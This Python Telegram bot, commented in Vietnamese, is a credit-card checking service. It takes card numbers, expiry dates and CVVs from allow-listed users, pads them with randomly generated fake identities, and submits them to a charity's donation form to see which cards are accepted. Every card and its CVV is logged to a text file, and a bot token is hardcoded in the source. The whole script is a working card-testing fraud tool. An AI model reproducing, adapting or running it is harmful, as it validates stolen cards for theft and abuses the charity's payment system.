import logging
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thiết lập nest_asyncio
nest_asyncio.apply()

# Hàm để tạo số ngẫu nhiên trong khoảng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# Hàm để tạo email ngẫu nhiên
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# Hàm để tạo tên ngẫu nhiên
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Hàm để tạo mã bưu điện ngẫu nhiên
def random_zipcode():
    return random_num(1000, 9000)

# Hàm để kiểm tra định dạng thẻ và lấy thông tin
def extract_card_info(card_input):
    # Điều chỉnh biểu thức chính quy để nhận cả năm 2 hoặc 4 chữ số
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        # Nếu ano chỉ có 2 chữ số thì thêm "20" vào trước
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# Hàm để tìm thông báo lỗi trong phản hồi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()  # Trả về thông báo lỗi
    return None

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")

# Hàm xử lý lệnh /allow
async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453
    if update.effective_user.id == admin_id:
        user_id = int(context.args[0])
        with open("allowed_users.txt", "a") as f:
            f.write(f"{user_id}\n")
        await update.message.reply_text(f"Đã cho phép người dùng với ID {user_id}.")
    else:
        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")

# Hàm xử lý lệnh /unallow
async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453
    if update.effective_user.id == admin_id:
        user_id = int(context.args[0])
        lines = []
        with open("allowed_users.txt", "r") as f:
            lines = f.readlines()
        with open("allowed_users.txt", "w") as f:
            for line in lines:
                if line.strip() != str(user_id):
                    f.write(line)
        await update.message.reply_text(f"Đã hủy quyền người dùng với ID {user_id}.")
    else:
        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")

# Hàm xử lý lệnh /credit
async def credit_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453
    if update.effective_user.id == admin_id:
        user_id = int(context.args[0])
        credit = int(context.args[1])

        with open("user_credits.txt", "a") as f:
            f.write(f"{user_id}:{credit}\n")
        await update.message.reply_text(f"Đã thêm {credit} tín dụng cho người dùng với ID {user_id}.")
    else:
        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")

# Hàm xử lý lệnh /user
async def user_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    total_credit = 0

    try:
        with open("user_credits.txt", "r") as f:
            for line in f.readlines():
                line = line.strip()
                if not line:  # Bỏ qua dòng trống
                    continue
                try:
                    uid, credit = line.split(":")
                    if int(uid) == user_id:
                        total_credit += int(credit)
                except ValueError:
                    logger.warning(f"Dòng không hợp lệ: {line}")  # Ghi log dòng không hợp lệ
                    continue
    except FileNotFoundError:
        await update.message.reply_text("Chưa có tín dụng cho người dùng này.")
        return

    await update.message.reply_text(f"Bạn có {total_credit} tín dụng.")

# Hàm xử lý tin nhắn
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    card_info = extract_card_info(user_input)

    if not card_info:
        return  # Nếu không có thông tin thẻ, bot sẽ không trả lời

    with open("allowed_users.txt", "r") as f:
        allowed_users = {int(line.strip()) for line in f.readlines()}

    if update.effective_user.id not in allowed_users:
        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
        return

    cc, mes, ano, cvv = card_info

    # Kiểm tra tháng và năm hết hạn
    current_year = int(datetime.now().strftime("%y"))  # Lấy 2 chữ số cuối năm hiện tại
    current_full_year = int(datetime.now().strftime("%Y"))  # Lấy 4 chữ số năm hiện tại
    current_month = int(datetime.now().strftime("%m"))  # Lấy tháng hiện tại

    if len(ano) == 2:
        ano = "20" + ano  # Chuyển đổi năm 2 chữ số thành 4 chữ số
    ano = int(ano)

    if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
        await update.message.reply_text("Tháng hoặc năm hết hạn không hợp lệ.")
        return

    phone = random_num(710000009, 900000009)  # Tạo số điện thoại ngẫu nhiên
    email = random_email()  # Tạo email ngẫu nhiên
    name = random_name()  # Tạo tên ngẫu nhiên
    zipcode = random_zipcode()  # Tạo mã bưu điện ngẫu nhiên

    await update.message.reply_text("Đang xử lý thông tin...")

    # Gửi yêu cầu tới API
    async with aiohttp.ClientSession() as session:
        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
                                data={
                                    'tfa_4': 'tfa_5',
                                    'tfa_52': 'tfa_53',
                                    'tfa_7': 'tfa_317',
                                    'tfa_19': '1',
                                    'tfa_20': '',
                                    'tfa_21': name,  # Tên ngẫu nhiên
                                    'tfa_23': 'Vu',
                                    'tfa_27': phone,  # Số điện thoại
                                    'tfa_2276': zipcode,  # Mã bưu điện
                                    'tfa_25': email,  # Email
                                    'tfa_48': 'Web',
                                    'tfa_50': 'tfa_50',
                                    'tfa_59': cc,  # Số thẻ
                                    'tfa_60': mes,  # Tháng hết hạn
                                    'tfa_70': ano,  # Năm hết hạn
                                    'tfa_62': cvv,  # CVV
                                    'tfa_2273': 'G-BCL7XEG4WC',
                                    'tfa_2274': 'GTM-WMPTRWL',
                                    'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
                                    'tfa_dbFormId': '151',
                                    'tfa_dbResponseId': '',
                                    'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
                                    'tfa_dbWorkflowSessionUuid': '',
                                    'tfa_dbTimeStarted': '1727426006',
                                    'tfa_dbVersionId': '29',
                                    'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
                                }) as response:

            # Lấy nội dung phản hồi
            response_text = await response.text()

            # Kiểm tra chuyển hướng
            if response.history and response.status == 200:
                final_url = str(response.url)
                if "success" in final_url:
                    result_message = "Giao dịch hoàn tất thành công!"
                else:
                    # Tìm thông báo lỗi chỉ sau khi có phản hồi
                    error_message = extract_error_message(response_text)
                    result_message = error_message if error_message else "Giao dịch không thành công, vui lòng thử lại."
            else:
                result_message = "Đã xảy ra lỗi trong quá trình giao dịch."

            await update.message.reply_text(result_message)

            # Ghi log
            with open("user_logs.txt", "a") as log_file:
                log_file.write(f"User ID: {update.effective_user.id}, "
                               f"Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, "
                               f"Result: {result_message}\n")

# Hàm khởi động bot
def main():
    application = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()

    # Gán các handler
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("unallow", unallow_user))
    application.add_handler(CommandHandler("credit", credit_user))
    application.add_handler(CommandHandler("user", user_credits))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Bắt đầu chạy bot
    application.run_polling()

if __name__ == '__main__':
    main()
